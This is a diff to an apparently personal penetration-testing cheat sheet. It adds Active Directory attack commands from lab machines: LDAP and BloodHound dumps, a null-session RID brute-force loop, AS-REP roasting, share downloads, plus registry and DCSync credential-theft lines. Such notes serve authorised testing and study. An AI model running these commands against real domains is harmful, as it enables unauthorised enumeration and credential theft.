@@ -133,6 +133,18 @@
   - REG QUERY "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon" /v DefaultPassword /reg:64
 
 ### Active Directory
+[Cheatsheet](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/)
+- Steps
+  - SMB - shares
+  - LDAP - get info without credentials
+  - Kerberos - brute force name, AS-REP-Roast
+  - DNS: zone transfer
+  - RPC
+  - winRM
+  - Credentials
+    - bloodhound-python -c ALL -u ldap -p 'password' -d domain.at -ns $TARGET
+    - ldapdomaindump 'ldap://somain.dc' -u 'domain.at\ldap' -p 'passwd'
+
 - [GTfobins for Active Directory](https://wadcoms.github.io/#)
 - domain name
   - nslookup 
@@ -140,18 +152,31 @@
     - 127.0.0.1
     - $target
   - ldapsearch -h IP
-  - -x -h "DC=,DC="
+    - -x -h "DC=,DC="
+    - ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
+    - ldapsearch -x -b "dc=devconnected,dc=com" -H ldap://$TARGET
+    - ldapsearch -h domain.com -x -s name name
+    - ldapsearch -h support.htb -D 'ldap@support.htb' -w 'PASS' -b "DC=domain,DC=htb"| less
+
   - '(objectClass=Person)' sAMAccountName
+  - ldapdomaindump -u 'USERNAME\ldap' -p 'PASS' dc.domain.htb
+
 - find users: 
   - rpcclient -U "" -N $target
-  - getADUsers.py -all domain/user -dc-ip $target
+```
+# Brute-Force users RIDs
+for i in $(seq 500 1100); do
+    rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";
+done
+```
+
+- getADUsers.py -all domain/user -dc-ip $target
   
 - kerberos pre authentication disabled? - Kerbrute
   - kerbrute: identify users
   - getPNusers.py: fetch hash
     -  GetNPUsers.py -dc-ip $target -outputfile kerberos_hashes.txt -request -debug $Domain/User -no-pass
-
-  
+ 
 - Kerberoasting? getUserspn
   - Service Principals associated with user
 
@@ -185,7 +210,8 @@ Add-ObjectACL -PrincipalIdentity john -Credential $credt -Rights DCSync
 - SMB-CLIENT
 - smbclient -L //$target/ = List Shares
 - smbclient -L //$target -U admin/administrator
-- smbclient //$target/Users = Interactive shell to a share 
+- smbclient //$target/Users = Interactive shell to a share
+  - mask ""
   - mget *
   - recurse ON
   - prompt off
@@ -347,6 +373,12 @@ cat file | iconv -t utf-16le | base64 -w 0 = result
 echo powershell -enc result
 
 ```
+
+- Binaries
+  - dnSpy
+  - wine / mono
+  - csharp online
+  - ghidra
 
 - Impackt
   - /opt/impacket/
